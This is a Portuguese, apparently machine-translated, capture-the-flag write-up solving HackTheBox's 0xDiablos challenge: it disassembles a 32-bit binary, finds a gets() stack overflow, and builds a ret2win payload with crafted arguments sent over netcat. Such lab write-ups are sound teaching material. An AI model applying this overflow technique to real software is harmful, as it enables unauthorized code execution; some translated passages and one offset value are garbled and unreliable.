---
title: "Você conhece o 0xDiablos? - HackTheBox"
date: 2023-12-30
published: true
lang: pt-BR
translation_key: "0xdiablos-htb"
original_url: /0xdiablos-htb
permalink: /pt-br/0xdiablos-htb
---
# [](#intro)Introdução

Neste write-up, vamos dar uma olhada mais de perto no  Você sabe 0xDiablos  desafio em [HackTheBox](https://app.hackthebox.com). Podemos baixar os arquivos de desafio e testá-los em nossa própria máquina; mas para resolvê-lo, precisamos usar netcat.

# [](#level-description)Challenge description

A descrição do desafio diz:

> Descrição

> Perdi minha bandeira

Para entender melhor isso, vamos usar `nc` para conectar à máquina:

```bash
kaizen@celestial /tmp/htb $ nc 167.99.82.136 31251
You know who are 0xDiablos: 
hi mom
hi mom
```
Isto realmente parece um problema de excesso de buffer. Pelo que parece, passamos um valor fixo e recuperamo-lo. Vamos baixar os arquivos e investigar isso mais.

# [](#approach)Approach mindset

Como sempre, vamos manter a nossa mentalidade:

1. Compreender conceitos básicos
2. Compreender o problema
3. Criando um ataque
4. Resolvendo

Depois de baixar o arquivo, vemos que ele tem o nome `vuln` e temos:

```bash
kaizen@celestial /tmp/htb $ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```
mostrando-nos que é um executável ELF-32. Podemos precisar sujar as mangas usando o GDB para entender o que está acontecendo sob os capuzes.

## [](#mindset-step1)Passo 1 - Compreender conceitos básicos

Certo, mas o que é um executável de ELF-32 e GDB?

Arquivo ELF

Um arquivo executável LSB de 32 bits ELF pode ser dividido em:

- **ELF:** Significa Formato Executável e Linkable. Em termos simples, é a versão Linux de um arquivo .exe. É um formato de arquivo padrão para arquivos executáveis, bibliotecas compartilhadas e despejos de núcleo em Linux e outros sistemas operacionais do tipo Unix.
- **32bit**: Isto indica a arquitectura para a qual o arquivo está combinado. 32bit significa que seu uso é para uma arquitetura 32bit, em contraste de ser para um 64bit.
- **LSB**: Ou menos significativo Bit, refere-se à endianness do arquivo. LSB significa que o byte menos significativo de uma palavra é armazenado no menor endereço. Isto significa que funciona com formato pouco-endiano.

O fato de que este ELF não é despojado também nos diz que podemos possivelmente depura-lo em montagem, ou até mesmo C.

# # GDB

GDB (GNU Debugger) é um depurador, muitas vezes usado como uma ferramenta de engenharia reversa, que funciona em muitos sistemas Unix-like e trabalha com inúmeras linguagens de programação. Ele essencialmente nos permite apreender o código do programa em um formato de montagem para entender seu fluxo.

Vamos ver como podemos usá-lo. Para começar a analisar um executável, executamos:

```bash
$ gdb ./<executable>
```
Isto irá abrir o GDB CLI no seu terminal. Quando dentro, precisamos saber alguns comandos básicos:

- `run/r`: para executar o programa como ele é.
- `break/b *<address/function>`: define um ponto de paragem. O GDB irá pausar a execução do programa quando atingir este ponto.
- `x/20x <register>`: exibe o conteúdo da memória em um determinado endereço.
- `continue/c`: continua o fluxo de execução do programa.
- `stepi`: salta para a próxima instrução na pilha.
- `disassemble`: desmonta a função atual.

Isso fará mais sentido quando começarmos a analisar o arquivo binário ELF.

## [](#mindset-step2)Passo 2 - Compreendendo o problema

Primeiro, vamos usar `objdump` para obter as instruções de montagem de `vuln`:

```bash
$ objdump -d vuln
```
Isto vai dar um enorme depósito de montagem. O que é mais interessante aqui são as seguintes funções `flag`, `vuln` e `main`. A função `vuln` é chamada de `main` neste endereço:

```bash
[...snip...]
8049301:       83 ec 0c                sub    $0xc,%esp
8049304:       8d 83 38 e0 ff ff         lea    -0x1fc8(%ebx),%eax
804930a:       50                      push   %eax
804930b:       e8 60 fd ff ff            call   8049070 <puts@plt>
8049310:       83 c4 10                add    $0x10,%esp
8049313:       e8 5a ff ff ff             call   8049272 <vuln>
[...snip...]
```
Uma vez que `vuln` é chamado, chegamos ao ponto em que ele pede nossa entrada stdin:

```bash
[...snip...]
8049290:       50                      push   %eax
8049291:       e8 aa fd ff ff            call   8049040 <gets@plt>
8049296:       83 c4 10                add    $0x10,%esp
8049299:       83 ec 0c                sub    $0xc,%esp
804929c:       8d 85 48 ff ff ff          lea    -0xb8(%ebp),%eax
80492a2:       50                      push   %eax
80492a3:       e8 c8 fd ff ff            call   8049070 <puts@plt>
80492a8:       83 c4 10                add    $0x10,%esp
80492ab:       90                      nop
80492ac:       8b 5d fc                mov    -0x4(%ebp),%ebx
80492af:       c9                      leave
 [...snip...]
```
Como não há em nenhum lugar nas instruções uma chamada para a função `flag`, podemos precisar injetar uma chamada nós mesmos dentro do `gets@plt`, que é vulnerável ao transbordamento de buffer. Só precisamos saber o quanto a memória alocada é reservada ao buffer apontado pelo `%esp`, que é nossa entrada. Se tiver sucesso, podemos transbordar a pilha e sobrescrever o endereço de retorno para chamar a função `flag`.

As partes interessantes das funções `flag` são:

```bash
[...snip...]
 8049205:       e8 a6 fe ff ff            call   80490b0 <fopen@plt>
 804920a:       83 c4 10                add    $0x10,%esp
 804920d:       89 45 f4                mov    %eax,-0xc(%ebp)
 8049210:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
 8049214:       75 1c                   jne    8049232 <flag+0x50>
 8049216:       83 ec 0c                sub    $0xc,%esp
 8049219:       8d 83 14 e0 ff ff         lea    -0x1fec(%ebx),%eax
 804921f:       50                      push   %eax
 8049220:       e8 4b fe ff ff            call   8049070 <puts@plt>

 [...snip...]
 8049232:       83 ec 04                sub    $0x4,%esp
 8049235:       ff 75 f4                 push   -0xc(%ebp)
 8049238:       6a 40                   push   $0x40
 804923a:       8d 45 b4                lea    -0x4c(%ebp),%eax
 804923d:       50                      push   %eax
 804923e:       e8 0d fe ff ff            call   8049050 <fgets@plt>
 8049243:       83 c4 10                add    $0x10,%esp
 8049246:       81 7d 08 ef be ad de    cmpl   $0xdeadbeef,0x8(%ebp)
 804924d:       75 1a                   jne    8049269 <flag+0x87>
 804924f:       81 7d 0c 0d d0 de c0    cmpl   $0xc0ded00d,0xc(%ebp)
 8049256:       75 14                   jne    804926c <flag+0x8a>
```
Chamamos a fucção `fopen`, que aparentemente está abrindo um arquivo de texto e lendo seu conteúdo. Em seguida, no `0x08049214` estamos pulando para a próxima parte do código, se abrir o arquivo foi bem sucedido. Dentro das instruções `cmpl`, estamos comparando `$0xdeadbeef` com o que é armazenado em `0x8(%ebp)` e `$0xc0ded00d` com o que é armazenado em `0xc(%ebp)`. Se combinarem, continuamos com isto:


```bash
[...snip...]
8049258:       83 ec 0c                sub    $0xc,%esp
804925b:       8d 45 b4                lea    -0x4c(%ebp),%eax
804925e:       50                      push   %eax
804925f:       e8 cc fd ff ff            call   8049030 <printf@plt>
8049264:       83 c4 10                add    $0x10,%esp
8049267:       eb 04                   jmp    804926d <flag+0x8b>
[...snip...]
```
que imprime o conteúdo do `fopen`.


## [](#mindset-step3)Passo 3 - Criando o ataque

Para que isso funcione, precisamos encontrar o deslocamento exato para o qual transbordamos o buffer e injetar uma chamada para a função `flag`. Para calcular o deslocamento, podemos usar `pwntools` em Python e criar uma entrada ciclada. Isto irá calcular uma estimativa aproximada de quantos bytes precisamos para transbordar e injetar uma chamada. Um script Python simples deve fazer o trabalho:

```python
from pwn import cyclic
import sys
pattern = cyclic(300)
sys.stdout.buffer.write(pattern)
```
Vamos criar um arquivo com isso como uma carga útil a ser passada para o executável `vuln`. Podemos correr.

```bash
(htb-venv) kaizen@celestial /tmp/htb $ python3 cycle.py > cycle.txt
(htb-venv) kaizen@celestial /tmp/htb $ cat cycle.txt 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
```
Agora, precisamos passar isso como uma carga útil para o executável `vuln` e examinar em que endereço o programa trava. Para nos ajudar com isso, usaremos o GDB: `gdb ./vuln`. Uma vez dentro, corremos com `r < cycle.txt`:

```bash
(gdb) r < cycle.txt
Starting program: /tmp/htb/vuln < cycle.txt
Downloading separate debug info for system-supplied DSO at 0xf7fc7000                  
[Thread debugging using libthread_db enabled]                                          
Using host libthread_db library "/usr/lib/libthread_db.so.1".
You know who are 0xDiablos: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()
```
A pilha caiu em `0x62616177`. Agora, podemos calcular o deslocamento dando este endereço para `pwntools`:

```python
from pwn import cyclic_find
eip_value = 0x61776261
offset = cyclic_find(eip_value)
print(f"The offset: {offset}")
```
Dá:

```bash
(htb-venv) kaizen@celestial /tmp/htb $ python3 offset.py 
The offset: 186
```
Assim, o offset é aproximadamente 186. Eu digo aproximadamente, porque este método nem sempre funciona, mas sempre dá uma estimativa aproximada. Agora é hora de investigá-lo mais com GDB. Vamos tentar ver se podemos entregar uma carga útil com este offset e contendo o endereço da função `flag` a ser chamada. Poderíamos começar com esta carga útil `python3 -c "import sys; sys.stdout.buffer.write(b'A'*186 + <flag function address>)"`, onde neste caso, o endereço da função é: `0x080491e2`. Como estamos em um pequeno sistema endian, escrevemos a carga útil como segue:

```python
import sys
offset = 186
sys.stdout.buffer.write(b'A'*offset + b'\xe2\x91\x04\x08')
```
Vamos gravar a saída para um arquivo binário:

```bash
(htb-venv) kaizen@celestial /tmp/htb $ python3 -c "import sys; sys.stdout.buffer.write(b'A'*186 + b'\xe2\x91\x04\x08')" > payload.bin
```
Agora, com o GDB, podemos analisar se o offset está correto:

```bash
(gdb) r < payload.bin
Starting program: /tmp/htb/vuln < payload.bin
Downloading separate debug info for system-supplied DSO at 0xf7fc7000                  
[Thread debugging using libthread_db enabled]                                          
Using host libthread_db library "/usr/lib/libthread_db.so.1".
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0x08000804 in ?? ()
```
Note que o programa caiu em `0x08000804`. Isso sugere que o endereço de retorno pode não ter sido substituído com o endereço correto, ou seja, nosso offset está errado. Com um deslocamento de 187, temos o mesmo, mas agora no endereço `0x00080491`. Como podemos ver, lentamente nossa carga útil está sendo sobrescrita no registro `$eip`. Com 188 nós temos uma falha de segmentação no `0xdeadbeef`, e com 189 nós obtemos no `0x91e24141`. Isso indica que o deslocamento correto é 188, uma vez que o crash em 0xdeadbeef com este offset confirma que a localização exata do endereço de retorno na pilha está sendo alvo. O endereço de retorno é sobrescrito com os bytes de nossa carga útil e chamando a função `flag`.

Além disso, isso é o que temos quando passamos a carga útil para o executável com um offset de 188:

```bash
(htb-venv) kaizen@celestial /tmp/htb $ python3 -c "import sys; sys.stdout.buffer.write(b'A'*188 + b'\xe2\x91\x04\x08')" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Hurry up and try in on server side.
```
> Apresse-se e tente no lado do servidor.

Esta parece ser uma mensagem que está sendo exibida na função bandeira. Vamos verificar com o GDB:

```bash
(gdb) b flag
Breakpoint 1 at 0x80491e6
(gdb) r < payload.bin
Starting program: /tmp/htb/vuln < payload.bin
Downloading separate debug info for system-supplied DSO at 0xf7fc7000                  
[Thread debugging using libthread_db enabled]                                          
Using host libthread_db library "/usr/lib/libthread_db.so.1".
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Breakpoint 1, 0x080491e6 in flag ()
```
Aha! Como esperado, estamos alcançando a função `flag` agora! É apenas uma questão de ajustar nossa carga útil agora para imprimir com sucesso o conteúdo do arquivo aberto com `fopen`. Vamos usar o GDB para investigar o fluxo da função `flag`:

```bash
[...snip...]
0x08049205 <+35>:    call   0x80490b0 <fopen@plt>
0x0804920a <+40>:    add    $0x10,%esp
0x0804920d <+43>:    mov    %eax,-0xc(%ebp)
0x08049210 <+46>:    cmpl   $0x0,-0xc(%ebp)
0x08049214 <+50>:    jne    0x8049232 <flag+80>
0x08049216 <+52>:    sub    $0xc,%esp
0x08049219 <+55>:    lea    -0x1fec(%ebx),%eax
0x0804921f <+61>:    push   %eax
0x08049220 <+62>:    call   0x8049070 <puts@plt>
[...snip...]
```
Observe que estamos comparando o conteúdo da pilha `%ebp` com `0x0`, que é C equivalente a `NULL`. Se o `cmpl` retornar true, nós não pulamos com `jne` e recebemos a mensagem "Se apresse e tente no lado do servidor." através da função `puts@plt`. Isso acontece porque não há nenhum arquivo de texto a ser aberto em nossa máquina local.

Sem saber o nome do arquivo aberto pelo `fopen`, não podemos ir mais longe com nossa análise localmente. Uma maneira de melhorar nossa análise é usando Ghidra. Ghidra é um software de engenharia reversa que muitas vezes reescreve o código original para nós a partir da montagem.

Depois de executar Ghidra, encontramos o seguinte:

<img src="../figs/ghidra-fopen.png" alt="ghidra">

Vemos que o nome do arquivo é `flag.txt`. Está bem! Podemos criar uma bandeira e continuar a testá-la localmente. Basta executar `echo "hi mom" > flag.txt` e voltar para GDB!

```bash
(gdb) r < payload.bin 
Starting program: /tmp/htb/vuln < payload.bin
Downloading separate debug info for system-supplied DSO at 0xf7fc7000                  
[Thread debugging using libthread_db enabled]                                          
Using host libthread_db library "/usr/lib/libthread_db.so.1".
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0xffffff00 in ?? ()
```
Note que agora não estamos entendendo a mensagem. Isso porque o programa está abrindo com sucesso o arquivo `flag.txt` e lendo seu conteúdo. O problema é que não é imprimi-lo para nós!

Olhando para Ghidra, vemos esta linha:

```c
[...snip...]
if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3))
[...snip...]
```
que é semelhante à linha analisada com `objdump`, onde compara os valores de dois registros com `0xdeadbeef` e `$0xc0ded00d`. Para activar esta declaração, precisamos de concatenar estes endereços na nossa carga útil. Esperemos que isto resolva o desafio!



## [](#mindset-step4)Passo 4 - Resolvendo!
Vamos testar nossa nova carga útil localmente:

```bash
(htb-venv) kaizen@celestial /tmp/htb $ python3 -c "import sys; sys.stdout.buffer.write(b'A'*188 + b'\xe2\x91\x04\x08' + b'\xef\xbe\xad\xde\x0d\xd0\xde\xc0')" > payload2.bin(htb-venv) kaizen@celestial /tmp/htb $ cat payload2.bin | ./vulnYou know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�ﾭ�
Segmentation fault (core dumped)
```
Note que não funcionou corretamente. Isto é porque precisamos passar o `param1` e `param2` como parâmetros de função. Para passá-los como parâmetro, precisamos preencher o registro EIP com um endereço. Este endereço pode ser essencialmente qualquer coisa, mas o seu tamanho em bytes importa. A carga útil final seria então:

```bash
(htb-venv) kaizen@celestial /tmp/htb :( $ python3 -c "import sys; sys.stdout.buffer.write(b'A'*188 + b'\xe2\x91\x04\x08' + b'mula\xef\xbe\xad\xde\x0d\xd0\xde\xc0')" > payload2.bin
(htb-venv) kaizen@celestial /tmp/htb $ cat payload2.bin | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
hi mom
Segmentation fault (core dumped)
```
Como podemos ver, agora imprimimos o valor do `flag.txt`. Este ajuste foi feito de tal forma que iria alinhar a pilha para a função `flag` para entender nossos paramters.

Vamos tentar no servidor agora!

```bash
^C(htb-venv) kaizen@celestial /tmp/htb $ cat payload2.bin - | nc 167.99.82.136 31987
You know who are 0xDiablos: 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAA�mulaﾭ�
HTB{redacted}
```
E ali está a nossa bandeira!

# [](#conclusions)Conclusão

Neste CTF, aprendemos muito mais sobre engenharia reversa, GDB e como explorar um fluxo de buffer simples. Como podemos ver, a exploração de engenharia reversa é extremamente difícil e problemática, mesmo na sua forma mais simples.

Espero que tenha aprendido algo que sabia hoje, e como sempre, nunca se esqueça de fazer sua pesquisa**!

<a href="/">Voltar</a>
